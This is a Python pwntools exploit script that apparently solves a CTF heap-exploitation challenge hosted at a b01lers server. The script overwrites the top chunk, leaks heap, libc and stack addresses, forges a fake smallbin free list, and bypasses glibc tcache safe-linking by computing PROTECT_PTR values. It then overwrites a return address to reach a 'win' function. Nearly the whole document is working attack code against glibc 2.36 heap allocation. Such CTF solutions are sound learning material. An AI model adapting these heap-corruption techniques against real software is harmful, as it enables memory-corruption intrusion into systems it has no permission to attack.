from pwn import *
import time

def int2bytes(num):
    mybytes = int(num).to_bytes(8, 'little')
    return mybytes


libc = ELF('./libc-2.36.so.6')
#r = remote('localhost', 4401)
r = remote('gold.b01le.rs', 4002)


def alloc(idx, size):
    r.sendlineafter(b'Resize----\n', b'1')
    r.sendlineafter(b'Where? ', idx)
    r.sendlineafter(b'size? ', size)

def free_view(choice, idx):
    r.sendlineafter(b'Resize----\n', choice)
    r.sendlineafter(b'Where? ', idx)

def edit(idx, msg):
    r.sendlineafter(b'Resize----\n', b'4')
    r.sendlineafter(b'Where? ', idx)
    r.recvline()
    #r.sendlineafter(b'size? ', b'10
    time.sleep(0.5)
    r.sendline(msg)

r.sendlineafter(b'Resize----\n', b'7')
win = r.recvline().strip()[11:]
win = int(win, 16)
print(hex(win))
size = 0x400 - 0x290 - 8

alloc(b'0', str(size).encode())
info("Overwriting top chunk")
edit(b'0', b'B'*size+p64(0xc01) + b'\x00' * (4096-size-8))

alloc(b'1', b'4096')
alloc(b'2', b'97')
edit(b'2', b'A'*16)
free_view(b'3', b'2')

r.recvline()
heap_leak = u64(r.recvline().strip().ljust(8, b'\x00')) * 256 - 0x400
info("Heap leak: %s" % hex(heap_leak))

alloc(b'3', b'97')
free_view(b'3', b'3')
libc_leak = u64(r.recvline().strip().ljust(8, b'\x00'))
libc.address = libc_leak - 0x1D1CC0
ld = libc.address + 0x1E2000
info("Libc leak: %s" % hex(libc.address))
info("Ld leak: %s" % hex(ld))

alloc(b'4', b'2552')
edit(b'4', 2551 * b'S')

fake_free = heap_leak + 0x600
buf2 = heap_leak + (0x600 + 0xe0)
buf1 = heap_leak + (0x600 + 0xe0) + 0x20

info("Buf2 location %s" % hex(buf2))
info("Buf1 location %s" % hex(buf1))
print(hex(fake_free))
print(hex(libc.sym[b'environ']))
alloc(b'5', b'1200')
edit(b'5', 1199 * b'T')

payload = b'F'*(0x9f8) + p64(0x101) + p64(0xdeadbeef) + p64(buf1)
edit(b'4', payload)

# Create the fake free list
payload = b'\x11'*0x110             # Padding to reach pointers

# -------------- Setup fake free list --------------- #
for i in range(1, 7):
    payload += p64(0xFFFFFFFFFFFFFFFF)*3    # Padding
    payload += p64(fake_free + (8*4)*i)     # Calculate offset to next fake free entry (BK pointer)
payload += p64(0xFFFFFFFFFFFFFFFF)*3        # Padding
payload += p64(0)                           # Null-byte to "terminate" free linked list
# -------------------------------------------------- #

# Buf 2
payload += p64(0)*2                     # Padding
payload += p64(buf1)                    # Forward pointer to buf 1
payload += p64(fake_free)               # Pointer to fake free list

# Buf 1
payload += p64(0)*2                     # Padding
payload += p64(heap_leak + 0xee0)       # Forward pointer to "victim chunk" to bypass the check of small bin corruption
payload += p64(buf2)                    # Backward pointer to buf 2

payload += b'\x44'*(0x9f8-len(payload)-1) # Padding

edit(b'4', payload)

alloc(b'6', b'248')
edit(b'6', 247 * b'L')

payload = b'A'*(0x128-1)            # Padding to reach FD of t-cache entry 0
#edit(b'4', payload)

# -------- Loop to abuse 8-byte alignment to reach t-cache --------- #
for i in range(2, 13):
    if i%3 == 0:
        payload += b'A'*0x10
    else:
        payload += b'A'*0x8
#    edit(b'4', payload)
# ------------------------------------------------------------------ #

prot_xor = heap_leak>>12    # Get the pos >> PAGE_SHIFT "xor key"
dest = heap_leak+0x100      # Destination is the malloc management chunk
fin = prot_xor ^ dest       # Calculate the PROTECT_PTR result
info("PROTECT_PTR res: %s^%s = %s" % (hex(prot_xor), hex(dest), hex(fin)))
payload += b'A'
edit(b'4', payload+p64(fin))   # Send payload

alloc(b'10', b'248')

alloc(b'12', b'248')

edit(b'12', int2bytes(libc.sym[b'__libc_argv']))

alloc(b'20', b'248')
free_view(b'3', b'20')

stack_leak = u64(r.recvline().strip().ljust(8, b'\x00'))
info("Stack leak at: %s" % hex(stack_leak))


final = stack_leak - 0x158

edit(b'12', int2bytes(final) + b'A')
alloc(b'30', b'248')
edit(b'30', b'A'*24 + p64(win))

r.interactive()
